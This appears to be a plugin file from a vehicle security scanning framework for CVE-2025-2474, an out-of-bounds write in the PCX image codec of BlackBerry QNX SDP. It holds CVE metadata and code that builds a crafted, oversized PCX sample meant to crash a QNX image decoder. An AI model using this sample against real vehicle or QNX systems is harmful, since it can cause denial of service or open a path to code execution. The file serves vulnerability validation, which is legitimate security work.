#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin
from local_exp_stimulus import build_local_sample_probe, write_temp_sample


VULN = {
    "id": 21,
    "cve": "CVE-2025-2474",
    "year": 2025,
    "domain": "IVI/OS/协议/隐私",
    "vendor_product": "BlackBerry QNX SDP",
    "component": "PCX image codec",
    "type": "越界写/RCE或DoS",
    "summary": "QNX SDP 8.0/7.1/7.0 PCX编解码器越界写，可DoS或代码执行。",
    "source_description": "Out-of-bounds write in the PCX image codec in QNX SDP versions 8.0, 7.1 and 7.0 could allow an unauthenticated attacker to cause a denial-of-service condition or execute code in the context of the process using the image codec.",
    "poc_status": "未见公开PoC；供应商公告",
    "research_value": "车载OS/多媒体/无钥匙系统供应链风险。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2025-2474",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2025-2474",
        "https://support.blackberry.com/pkb/s/article/140646",
        "https://cveawg.mitre.org/api/cve/CVE-2025-2474"
    ],
    "affected": [
        {
            "vendor": "BlackBerry",
            "product": "QNX Software Development Platform (SDP)",
            "versions": [
                {
                    "version": "8.0, 7.1 and 7.0",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2025-2474",
        "BlackBerry",
        "QNX",
        "SDP",
        "PCX",
        "image",
        "codec",
        "RCE",
        "DoS",
        "Out-of-bounds",
        "write",
        "could",
        "allow",
        "unauthenticated",
        "cause",
        "denial-of-service",
        "condition",
        "execute",
        "code",
        "context",
        "process",
        "using",
        "QNX Software Development Platform (SDP"
    ]
}


def _write_qnx_pcx_oob_sample() -> str:
    payload = (
        b"\x0a\x05\x01\x08"
        + b"\x00\x00\xff\x7f\xff\x7f\x00\x00"
        + b"\x01\x00"
        + b"\xff" * 48
        + b"\x01\x00"
        + b"\xff\xff"
        + b"\x00" * 58
        + b"\x0c"
        + b"A" * 8192
    )
    return write_temp_sample("autosec_cve_2025_2474_", ".pcx", payload)


def _pcx_oob_probe(plugin, vuln):
    return build_local_sample_probe(
        plugin,
        sample_param="pcx_sample_path",
        command_params=("qnx_image_decoder_cmd", "decoder_cmd"),
        generated_sample=_write_qnx_pcx_oob_sample,
        phenomenon="crafted PCX sample prepared for QNX PCX codec out-of-bounds write observation",
        operator_action="Run sample_path with a QNX image decoder or target media process via qnx_image_decoder_cmd/decoder_cmd and observe crash, ASAN, or process abort.",
    )


class Poc18CVE20252474OutOfBoundsRCEDoSAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-021'
    meta_poc_name = 'CVE-2025-2474 越界写/RCE或DoS Active Validation'
    meta_cve_id = 'CVE-2025-2474'
    meta_severity = 'Critical'
    meta_protocol = 'local'
    meta_target_os = ['qnx', 'linux']
    meta_required_params = ['software_inventory_text']
    meta_profiles = ['local_artifact']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2025-2474'
    meta_attack_surface = '系统/供应链组件'
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_pcx_oob_probe)
